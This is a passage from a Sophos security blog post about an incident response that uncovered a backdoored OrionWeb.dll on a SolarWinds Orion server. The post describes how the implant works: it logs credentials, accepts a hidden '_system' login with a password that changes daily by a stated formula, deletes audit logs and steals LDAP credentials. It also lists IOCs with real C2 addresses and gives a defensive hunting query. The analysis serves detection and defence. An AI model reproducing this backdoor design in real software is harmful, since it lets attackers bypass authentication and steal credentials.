<p>Whatever update is, it has been used to replace a component of SolarWinds Orion called <code>OrionWeb.dll</code>.</p>
<p>Time to investigate this DLL.</p>
<p>DLLs are dynamic-link libraries, bundles of executable code that are called upon by applications, implementing various features and capabilities of an application. One can’t simply swap out a DLL with something completely different without causing an application to crash or throw lots of errors.</p>
<p>This needs expert eyes to investigate. MTR shares a sample with SophosLabs for reverse engineering and analysis.</p>
<p>This sample is not cryptographically signed, which is odd for a DLL purporting to be from a reputable vendor.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png"><img loading="lazy" class="alignnone wp-image-72378" src="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png" alt="" width="300" height="421" srcset="https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png 363w, https://news.sophos.com/wp-content/uploads/2021/02/bad-details.png?resize=214,300 214w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>Digital signatures are a vital part of the trust model for Microsoft Windows. By using strong cryptography, these signatures enable both the authenticity of a file, confirming it is from who it says it is from, as well as the integrity of a file, confirming it has not been modified or corrupted in some way.</p>
<p>If someone were to modify this DLL, the digital signature would no longer validate the file integrity. But if the signature is entirely removed, there’s nothing to use to validate the file integrity at all.</p>
<p>MTR compares the file to a known-good copy of <code>OrionWeb.dll</code> and it is clear this file was and should be signed. Who removed the signature? And why?</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png"><img loading="lazy" class=" wp-image-72381" src="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png" alt="" width="300" height="377" srcset="https://news.sophos.com/wp-content/uploads/2021/02/good-details.png 405w, https://news.sophos.com/wp-content/uploads/2021/02/good-details.png?resize=239,300 239w" sizes="(max-width: 300px) 100vw, 300px" /></a><a href="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png"><img loading="lazy" class=" wp-image-72382" src="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png" alt="" width="300" height="358" srcset="https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png 405w, https://news.sophos.com/wp-content/uploads/2021/02/good-signature-2.png?resize=252,300 252w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p><code>OrionWeb.dll</code> is a .NET assembly, written in C# (pronounced “C sharp”). C# is a Microsoft programming language that can easily take advantage of the capabilities of the .NET (“dotNET”) framework, and .NET is Microsoft&#8217;s powerful framework for writing applications for their platforms and interfacing with various Microsoft technologies.</p>
<p>One of the benefits of .NET assemblies is that they can be debugged and modified far easier than traditional compiled executables. One can open them up in a variety of tools like <a href="https://github.com/dnSpy/dnSpy">dnSpy</a> and read and change the code they contain.</p>
<p>SophosLabs fully decompile the suspicious DLL and compare it to a known-good sample using the popular diff application <a href="https://winmerge.org/">WinMerge</a>, a tool that enables file comparison and highlights the differences between them.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png"><img loading="lazy" class="alignnone size-full wp-image-72380" src="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png" alt="" width="640" height="459" srcset="https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png 1173w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=300,215 300w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=768,551 768w, https://news.sophos.com/wp-content/uploads/2021/02/dll-diff.png?resize=1024,734 1024w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>But as SophosLabs begin to dig into what had been changed, the changes seem incredibly minor. For instance, where the class of code <code>LdapAuthentication</code> previously inherited the other classes <code>ILdapAuthentication</code> and <code>IDisposable</code> in that order, the order was reversed in the suspicious sample.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png"><img loading="lazy" class="alignnone size-full wp-image-72387" src="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png" alt="" width="640" height="285" srcset="https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png 2024w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=300,133 300w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=768,342 768w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=1024,455 1024w, https://news.sophos.com/wp-content/uploads/2021/02/parameter-refactor.png?resize=1536,683 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Reviewing many of the other classes of code in the files, this same pattern of change is observed – parameters swapped around for no obvious reason. Anyone quick to run their eye over these changes would rightfully assume that the software developer has just refactored (i.e. reorganized) their code and nothing suspicious or malicious is present.</p>
<p>Yet given the context of how this file was discovered, SophosLabs and our operators push on with analyzing the sample to try and discover why this different DLL is so important to them that they needed to replace the original with it.</p>
<p>Eventually a discovery is made in the <code>ValidateUser</code> function (in SolarWinds.Orion.Web.OrionMembershipProvider). A chunk of code has been inserted. And it completely changes the behavior of the function.</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png"><img loading="lazy" class="alignnone size-full wp-image-72376" src="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png" alt="" width="640" height="307" srcset="https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png 2019w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=300,144 300w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=768,368 768w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=1024,491 1024w, https://news.sophos.com/wp-content/uploads/2021/02/backdoor-implant.png?resize=1536,736 1536w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p><strong>This SolarWinds Orion server was backdoored!</strong></p>
<h2>A Hidden Backdoor</h2>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png"><img loading="lazy" class="alignnone size-full wp-image-72386" src="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png" alt="" width="640" height="498" srcset="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png 2336w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=300,233 300w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=768,597 768w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=1024,796 1024w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=1536,1194 1536w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll.png?resize=2048,1592 2048w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>The original <code>ValidateUser</code> function was quite simple – it would be called with a username and password and then, behind the scenes, it would call another function called <code>InternalValidateUser</code> that would do the heavy lifting of authenticating the user.</p>
<p>However, the actor behind this threat added a lot of extra logic to the <code>ValidateUser</code> function.</p>
<p>First, a <code>try/catch</code> pattern was inserted on lines 5 and 54 with the <code>catch</code> block empty. This pattern ensures that any errors that may occur in the try block are suppressed and don’t cause the whole application to crash or print out errors that may reveal something is awry.</p>
<p>Next, a <code>StreamWriter</code> was added on line 7 which would write text to a seemingly randomly named file in the <code>C:\Users\Default\AppData\Local\Temp\</code> directory. Any provided username and password would be written to the file, encrypted with a simple binary XOR and Addition cipher with hard coded keys.</p>
<p>The adversary wanted to continuously capture a stream of valid usernames and passwords for SolarWinds Orion.</p>
<p>After that, a conditional <code>if</code> statement was inserted on line 21 which looked for when the provided username is <code>_system</code>. A username that did not exist in the application’s database. A username only the adversary would know about.</p>
<p>Within the <code>if</code> statement were several instructions to access the application’s SQL database and delete the audit logs that would have revealed any usage of this <code>_system</code> username. The threat actor clearly had knowledge of how OrionWeb functions and how best to cover their tracks.</p>
<p>A text string was then constructed on line 57 and 58 that would take the number of days since epoch – a specific point in time which is counted upwards from to describe the current date/time. Effectively this string is the number of days since January 1st 1970. Around the number of days since epoch, <code>80CD1DB_</code> and <code>_0F90D2</code> are added, e.g. <code>80CD1DB_42745_0F90D2</code>.</p>
<p>But why would a dynamic text string be needed, one that changes every single day? The answer soon becomes clear.</p>
<p>The final modification was in the return statement on line 59.</p>
<p>The original statement would call the <code>InternalValidateUser</code> function. Inferring from the changes, this function would either return <code>True</code> or <code>False</code> (for either a successful or unsuccessful authentication). Yet the adversary had added two additional ways for the <code>ValidateUser</code> function to return <code>True</code>. If the password is this dynamic text string, or if the username is “_system” and the password is also the dynamic text string.</p>
<p>The adversary implanted a custom, dynamic password and username that only they would know about and ensured their usage of these credentials would never end up in the SolarWinds Orion audit logs.</p>
<p>And then another malicious injection is found.</p>
<p>Lurking in the <code>GetLdapIdentity</code> function (in <code>SolarWinds.Orion.Web.OrionMixedModeAuth</code>), SophosLabs discover the following code:</p>
<p><a href="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png"><img loading="lazy" class="alignnone size-full wp-image-72385" src="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png" alt="" width="640" height="186" srcset="https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png 2413w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=300,87 300w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=768,223 768w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=1024,297 1024w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=1536,446 1536w, https://news.sophos.com/wp-content/uploads/2021/02/orionweb-dll-2.png?resize=2048,595 2048w" sizes="(max-width: 640px) 100vw, 640px" /></a></p>
<p>Similar to the <code>StreamWriter</code> observed above, the functionality intercepts credentials as they are being used by the application and encrypts and writes them to another seemingly randomly named file. But this time the adversary is stealing LDAP, Lightweight Directory Access Protocol, credentials which are used for authenticating with directory services like Microsoft Active Directory.</p>
<p>The adversary wanted to continuously capture a stream of valid usernames and passwords for the customer’s domain, not just for SolarWinds Orion.</p>
<p>Thankfully, the affected hosts are already isolated. MTR confirms with the customer that these hosts are taken offline and are rebuilt to ensure no backdoor remains in their network.</p>
<h2>The Big Picture</h2>
<p>The sequence of events is now clear:</p>
<ul>
<li>The threat actor gained access to the web server and installed a web shell to send commands and orchestrate the rest of the attack</li>
<li>A backdoored version of OrionWeb.dll was downloaded from their C2 server. Additional logic was added to authenticate the username “_system” with a dynamic password that would change every day and the digital signature of the file removed.</li>
<li>OrionWeb.dll was replaced with their backdoored version.</li>
<li>Discovery was performed and domain controllers accessed to create a full dump of Active Directory to use for privilege escalation or to exfiltrate.</li>
</ul>
<p>Given the recent supply chain attack on SolarWinds, this attack is certainly of note. However, we could not identify concrete evidence that the two are connected. The C2s, web shell, and DLL used in this attack are not ones we have observed before, outside of this single incident, nor have we observed them used since.</p>
<p>This style of attack is not specific to SolarWinds Orion and does not rely upon the exploitation of a vulnerability in its code. A threat actor can reverse engineer and maliciously modify a .NET assembly using freely available tools with no requirement for source code access.</p>
<p>The threat actor behind this attack is clearly highly skilled and capable. Their playbook of identifying viable .NET assemblies to backdoor underlines the importance of threat hunting, as well as application allowlisting and file integrity monitoring (both available in Sophos Intercept X Advanced for Server).</p>
<p>We hope the details shared through this casebook as well as the IOAs and IOCs below enable threat hunters around the globe to look for similar malicious modifications of OrionWeb.dll and other .NET assemblies, which will aid in better protection for all.</p>
<h2>Learn more</h2>
<p>For more information on the Sophos MTR service <a href="https://sophos.com/mtr">visit our website</a> or <a href="https://secure2.sophos.com/en-us/products/managed-threat-response/contact-request.aspx">speak with a Sophos representative</a>.</p>
<p>If you prefer to conduct your own threat hunts <a href="https://www.sophos.com/en-us/products/endpoint-antivirus/edr.aspx">Sophos EDR</a> gives you the tools you need for advanced threat hunting and IT security operations hygiene. Start a <a href="https://secure2.sophos.com/en-us/products/endpoint-antivirus/free-trial.aspx">30-day no obligation trial</a> today.</p>
<h2>IOAs / IOCs</h2>
<table>
<tbody>
<tr>
<td><strong>Description</strong></td>
<td><strong>Indicator</strong></td>
</tr>
<tr>
<td>Web shell SHA256 (about.aspx)</td>
<td>f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e</td>
</tr>
<tr>
<td>Sophos detection for web shell</td>
<td><a href="https://www.virustotal.com/gui/file/f39dc0dfd43477d65c1380a7cff89296ad72bfa7fc3afcfd8e294f195632030e/detection">Troj/WebShel-H</a></td>
</tr>
<tr>
<td>C2 URLs</td>
<td>http://98.225.248.37:8090<br />
http://216.243.39.167:8090</td>
</tr>
<tr>
<td>C2 IPv4s</td>
<td>98.225.248.37<br />
216.243.39.167</td>
</tr>
<tr>
<td>Backdoored OrionWeb.dll SHA256</td>
<td>a25fc5af86296dcd5bb41668443a36947bccd17a1687f9b118675f1503b3e376</td>
</tr>
<tr>
<td>Sophos detection for .dll</td>
<td><a href="https://www.virustotal.com/gui/file/a25fc5af86296dcd5bb41668443a36947bccd17a1687f9b118675f1503b3e376/detection">Mal/Generic-S + Troj/MSIL-QJK</a></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>MITRE ATT&amp;CK</h2>
<table>
<tbody>
<tr>
<td><b>ID </b></td>
<td><b>Tactic </b></td>
<td><b>Technique </b></td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1047/">T1047</a></td>
<td>Execution</td>
<td>Windows Management Instrumentation</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1059/001/">T1059.001</a>/<a href="https://attack.mitre.org/techniques/T1059/003/">.003</a></td>
<td>Execution</td>
<td>Command and Scripting Interpreter</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1505/003/">T1505.003</a></td>
<td>Persistence</td>
<td>Server Software Component: Web Shell</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1554/">T1554</a></td>
<td>Persistence</td>
<td>Compromise Client Software Binary</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1078/002/">T1078.002</a></td>
<td>Privilege Escalation</td>
<td>Valid Accounts: Domain Accounts</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1070/004/">T1070.004</a>/<a href="https://attack.mitre.org/techniques/T1070/006/">.006</a></td>
<td>Defense Evasion</td>
<td>Indicator Removal on Host</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1003/003/">T1003.003</a></td>
<td>Credential Access</td>
<td>OS Credential Dumping: NTDS</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1556/">T1556</a></td>
<td>Credential Access</td>
<td>Modify Authentication Process</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1087/002/">T1087.002</a></td>
<td>Discovery</td>
<td>Account Discovery: Domain Account</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1570/">T1570</a></td>
<td>Lateral Movement</td>
<td>Lateral Tool Transfer</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1056/003/">T1056.003</a></td>
<td>Collection</td>
<td>Input Capture: Web Portal Capture</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1071/001/">T1071.001</a></td>
<td>Command and Control</td>
<td>Application Layer Protocol: Web Protocols</td>
</tr>
<tr>
<td><a href="https://attack.mitre.org/techniques/T1571/">T1571</a></td>
<td>Command and Control</td>
<td>Non-Standard Port</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<h2>Intercept X EDR</h2>
<h3>Live Discover Query</h3>
<p><a href="https://twitter.com/AltShiftPrtScn">Peter Mackenzie</a>: In Sophos Rapid Response, we would use the query below to get started, this has 3 variables (begin, end, cmd) so you can set the date range you are looking at as well as the command you are looking for. For you example you might start by looking for the string: <code>% wmic /user:"%”%</code></p>
<p>Allowing for a wildcard at the start and end, as well as for any username. This would likely bring back any results where wmic was being used with someone’s credentials. The query itself brings back lots of useful information from our journals, including when the file was created, and which user executed the command.</p>
<pre>SELECT  
CAST(strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.time,'unixepoch')) AS TEXT) DATE_TIME,   
spj.sophosPID,  
spj.pathname,  
spj.cmdline,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.btime,'unixepoch')) AS First_Created_On_Disk,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.ctime,'unixepoch')) AS Last_Changed,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.mtime,'unixepoch')) AS Last_Modified,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(f.atime,'unixepoch')) AS Last_Accessed,  
spj.parentSophosPid,  
strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.processStartTime,'unixepoch')) AS Process_Start_Time,  
CASE WHEN strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.endTime,'unixepoch')) = '1970-01-01 00:00:00'  
THEN '-' ELSE strftime('%Y-%m-%dT%H:%M:%SZ',datetime(spj.endTime,'unixepoch')) END AS Process_End_Time,  
spj.fileSize,  
spj.sid,  
u.username,  
spj.sha256  
FROM sophos_process_journal spj  
JOIN file f ON spj.pathname = f.path  
JOIN users u ON spj.sid = u.uuid  
WHERE spj.time &gt;= CAST($$begin$$ AS INT)  
AND spj.time &lt;= CAST($$end$$ AS INT)  

AND spj.cmdline LIKE '$$cmd$$';</pre>
<h2>Acknowledgements</h2>
<p>I would like to thank (in no particular order) Fraser Howard, Guido Denzler, Gabe Renfro, Jordon Carpenter, Tyler Wojcik, Jordan Konicki, Steven Lott, Mat Gangwer, Alemdar Halis, and Savio Lau for their efforts in detecting, investigating, and responding to this novel threat.</p>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2021/02/02/sophos-zero-trust-network-access-ztna-is-coming-soon/" rel="prev">Sophos zero trust network access (ZTNA) is coming soon</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2021/02/08/have-a-domain-name-beg-bounty-hunters-may-be-on-their-way/" rel="next">Have a domain name? “Beg bounty” hunters may be on their way</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Author			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img width="145" height="145" src="https://news.sophos.com/wp-content/uploads/2019/06/Greg-small.png?w=145" class="avatar avatar-145 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/greg-iddon/" title="Posts by Greg Iddon" class="author url fn" rel="author">Greg Iddon</a></h3>

					
					<div class="author-bio">
						<p>Greg is a strategist in the Sophos Technology Office and a manager for Sophos Managed Threat Response. Driven by a desire to make the digital world a safer place, Greg has a passion for cybersecurity that has consumed the past 15 years of his life. </p>
<p>A rampant, idiosyncratic nerd with a thoroughly 'British' sense of humour, Greg strongly believes that the complexities of computing and security can be made accessible, funny, and interesting to the masses, and takes every opportunity to share his passion with anyone who wishes to listen.</p>
					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='72266' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="9c1c22a8c1" /></p><input type="hidden" id="ak_js" name="ak_js" value="20"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-70291" class="second-featured post-70291 post type-post status-publish format-standard has-post-thumbnail hentry category-corporate category-mtr category-products tag-mtr tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/09/sophos-mtr-2.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">27</span>
				<span class="month">Oct</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/corporate/">Corporate</a> &bull; <a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/10/27/mtr-casebook-an-active-adversary-caught-in-the-act/" rel="bookmark">MTR Casebook: An active adversary caught in the act</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-69619" class="second-featured post-69619 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-products tag-mtr tag-sophos-managed-threat-response-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">28</span>
				<span class="month">Sep</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/09/28/report-managed-detection-and-response-mdr-buyers-guide/" rel="bookmark">Report: Managed Detection and Response (MDR) Buyers Guide</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-69538" class="second-featured post-69538 post type-post status-publish format-standard has-post-thumbnail hentry category-corporate category-mtr tag-maze tag-mtr tag-ransomware tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">22</span>
				<span class="month">Sep</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/corporate/">Corporate</a> &bull; <a href="https://news.sophos.com/en-us/category/mtr/">MTR</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/09/22/mtr-casebook-blocking-a-15-million-maze-ransomware-attack/" rel="bookmark">MTR Casebook: Blocking a $15 million Maze ransomware attack</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-68677" class="second-featured post-68677 post type-post status-publish format-standard has-post-thumbnail hentry category-corporate category-mtr tag-mtr tag-ransomware tag-sophos-managed-threat-response-mtr tag-sophos-mtr tag-sophoslabs region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">18</span>
				<span class="month">Aug</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/corporate/">Corporate</a> &bull; <a href="https://news.sophos.com/en-us/category/mtr/">MTR</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/08/18/mtr-casebook-the-ransomware-hunt-that-unearthed-a-historic-banking-trojan/" rel="bookmark">MTR Casebook: The ransomware hunt that unearthed a historic banking trojan</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type='text/javascript' src='https://news.sophos.com/_static/??-eJyVkMEOwiAMhl9IYCw648H4KAZZ3ZgUCAWnby9mWeLBw0h66d/va5OKOTDtXQKXRBoBgQT5MHpyMBNrG3kUE5UqkH8YYM+Wt1yWgC8Bn2gnNu3QPlbQ8EpR0XZ+iXhOxtZbWmFQZnDVYlAxOYjV3qCqlW+2SsZpm3ug5a2IZQGLEOybo3H/oNIC3qD/na+XMbNg82AcCfUwhJDEtbji7iMW9oJn2cnDvmuaUzN9AG09yg4='></script>
<script src='https://stats.wp.com/e-202112.js' defer></script>
<script>
	_stq = window._stq || [];
